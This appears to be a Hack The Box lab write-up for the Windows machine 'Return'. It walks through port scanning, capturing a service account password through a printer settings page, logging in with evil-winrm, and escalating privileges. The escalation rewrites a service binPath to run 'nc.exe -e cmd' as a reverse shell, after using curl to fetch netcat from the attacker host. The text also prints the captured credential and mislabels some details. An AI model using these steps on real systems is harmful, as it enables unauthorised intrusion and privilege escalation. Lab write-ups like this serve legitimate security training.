# Return

## General Information

<h3>Difficulty: <img src="https://img.shields.io/badge/F%C3%A1cil-green?style=flat-square"> </h3>

<h3>Operating system: Windows </h3>

<h3>Exploited vulnerability. Samba and vmtools exploitation</h3>

<h3>Data os resolution: 05/08/2025</h3>

<h3>Link: <a href="https://app.hackthebox.com/machines/Return" target="_blank">Return</a></h3>

### *Read this document in Espagnol* <a href="return.md">return</a>

## Recognition

TryHackme gives us the IP of the target machine **10.10.11.108**

I'm going to set the IP of the target machine in the **/etc/hosts** file. I'm going to call it **return**

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 return
```

**The ttl is 128. Therefore, it is Window**

### Scanning for open ports

#### TCP port scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn return
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service       | Version                                 |
| --------- | ------------- | --------------------------------------- |
| 53        | domain        | Simple DNS Plus                         |
| 80        | http          | Microsoft IIS httpd 10.0                |
| 88        | kerberos-sec  | Microsoft Windows Kerberos              |
| 135       | msrpc         | Microsoft Windows RPC                   |
| 139       | netbios-ssn   | Microsoft Windows netbios-ssn           |
| 389       | ldap          | Microsoft Windows Active Directory LDAP |
| 445       | microsoft-ds? |                                         |
| 464       | kpasswd5?     |                                         |
| 593       | ncacn_http    | Microsoft Windows RPC over HTTP 1.0     |
| 636       | tcpwrapped    |                                         |
| 3268      | ldap          | Microsoft Windows Active Directory LDAP |
| 3269      | tcpwrapped    |                                         |
| 5985      | http          |                                         |
| 9389      | mc-nmf        | .NET Message Framing                    |
| 47001     | http          | Microsoft HTTPAPI httpd 2.0             |
| 49664     | msrpc         | Microsoft Windows RPC                   |
| 49665     | msrpc         | Microsoft Windows RPC                   |
| 49666     | unknown       |                                         |
| 49667     | msrpc         | Microsoft Windows RPC                   |
| 49671     | unknown       |                                         |
| 49674     | ncacn_http    | Microsoft Windows RPC                   |
| 49675     | unknown       |                                         |
| 49679     | msrpc         | Microsoft Windows RPC                   |
| 49682     | msrpc         | Microsoft Windows RPC                   |
| 49697     | unknown       |                                         |
| 64328     | msrpc         | Microsoft Windows RPC                   |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn return
```

<p align="center"> 
<img src="images/UDP.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open Port | SERVICE      | STATE  |
| --------- | ------------ | ------ |
| 53/udp    | domain       | Open   |
| 88/udp    | kerberos-sec | Open   |
| 123/udp   | ntp          | Open   |
| 389/udp   | ldap         | Open   |
| 10080/udp | amanda       | Closed |

</div>

Next, we will try to detect any vulnerability with nmap using the following command:

```
nmap --script smb-vuln* -p445 <ip de la victima> -Pn
```

<p align="center"> 
<img src="images/vuln.png" width="600" alt="Resultado de Nmap">
</p>

We haven't achieved anything :(

## Scanning

### SMBMAP

```
sudo apt install python3.13-venv
python3 -m venv venv
source venv/bin/activate
pip install smbmap
smbmap -H return 
```

<p align="center"> 
<img src="images/smbmap.png" width="600" alt="Resultado de Nmap">
</p>

I tried to log in anonymously but couldn't. **I need a username and password.**

### LinkFinder

```
cd LinkFinder 
python3 linkfinder.py -d -i http://return/ -o cli  
```

<p align="center"> 
<img src="images/linkfinder.png" width="600" alt="Resultado de Nmap">
</p>

Nothing interesting.

### Fuzzing web

```
gobuster dir -u http://return -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/fzw.png" width="600" alt="Resultado de Nmap">
</p>

```
http://return/
```

<p align="center"> 
<img src="images/printer.png" width="600" alt="Resultado de Nmap">
</p>

Solo funciona el boton **Settings**

```
http://return/settings.php
```

<p align="center"> 
<img src="images/settings.png" width="600" alt="Resultado de Nmap">
</p>

Where it says **Server Address** we must enter our IP address which would be **10.10.14.36** and leave the rest the same. Then, we prepare the listening port with this command **nc -lvnp 389** and update it

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

**User**: svc-printer\
**Password**: 1edFg43012!! 

Obtained

Now knowing the password, we can perform **SMBMAP**

```
smbmap -H return -u 'svc-printer' -p '1edFg43012!!'
```

<p align="center"> 
<img src="images/smb.png" width="600" alt="Resultado de Nmap">
</p>

The output shows that authentication is successful and you can access several SMB shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL), but only with read permissions.

## Exploitation

### Crackmapexec

With this tool we can also find out what we are dealing with.

```
crackmapexec smb return
```

Basically it tells us that the domain is called PRINTER, Windows 10 and its domain is return.local and that the smb is signed

```
crackmapexec smb return -u 'svc-printer' -p '1edFg43012!!'
```

<p align="center"> 
<img src="images/crack.png" width="600" alt="Resultado de Nmap">
</p>

You are successfully authenticating against a Windows server named PRINTER

Now with these credentials, I can connect via Windows Remote Management (winrm)

```
crackmapexec smb winrm -u 'svc-printer' -p '1edFg43012!!'
```

<p align="center"> 
<img src="images/crack2.png" width="600" alt="Resultado de Nmap">
</p>

We check that we can connect (**We can connect because it says Pwn3d!)**. Next, we'll use the **evil-winrm** tool.

```
evil-winrm -i return -u 'svc-printer' -p '1edFg43012!!'
```

<p align="center"> 
<img src="images/evil.png" width="600" alt="Resultado de Nmap">
</p>

**We're in**

```
cd Desktop
type user.txt
```

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

## Post-Exploitation

### Privilege Escalation

To perform privilege escalation, I need to do the following:

Download Netcat for Windows, since my attacking machine is Windows.

```
https://eternallybored.org/misc/netcat/
```

<p align="center"> 
<img src="images/netcat.png" width="600" alt="Resultado de Nmap">
</p>

Another way to get the binary is to type this command

```
locate nc.exe 
```

*/usr/share/windows-resources/binaries/nc.exe*

**We got the installer**

Then share it to my victim machine

```
python3 -m http.server 80
```

<p align="center"> 
<img src="images/nc2.png" width="600" alt="Resultado de Nmap">
</p>

We'll focus on sharing the **nc64.exe** file.

We download it to our victim machine.

```
curl 10.10.14.36/nc64.exe -o nc.exe
```

IP 10.10.14.36 is the HTB VPN to clarify any doubts.

<p align="center"> 
<img src="images/evil2.png" width="600" alt="Resultado de Nmap">
</p>

Then I use this command:

```
services
```

<p align="center"> 
<img src="images/path.png" width="600" alt="Resultado de Nmap">
</p>

After some investigation, I discovered that the only modifiable file is **vmtools**

```
sc.exe config VMTools binPath='C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.36 4444'
```

Using the sc.exe command, we can modify Windows files. In this case, we can modify **vmtools** to gain **root** status.

Then, we set up the listening port in a separate terminal.

```
nc -lvp 4444
```

In the other terminal, we write the following command:

```
sc.exe start VMtools
```

Then once logged in, to locate the root red flag, it would be:

```
cd /Users/Administrator/Desktop
type root.txt 
```

<p align="center"> 
<img src="images/4444.png" width="600" alt="Resultado de Nmap">
</p>

You have to do it quickly, since the session closes very quickly.

**Machine Termined**

## Conclusion

On this machine called **Return** from **HTB**. I encountered one of my biggest challenges: intruding into a Windows system.

By enumerating the ports, I sensed the attack would focus on **Samba**, something I suspected based on previous experience.

I found the method used to obtain the password and subsequently access the system using **evil-winrm** quite interesting.

The real complication came with the privilege escalation; at first, I couldn't understand it, but after analyzing different methods, I discovered the key was to leverage the **vmtools** file, modifying the user's permissions with the **sc.exe** command and its appropriate parameters.

In short, it was a rather curious machine that taught me a new way to exploit the **Samba** port.
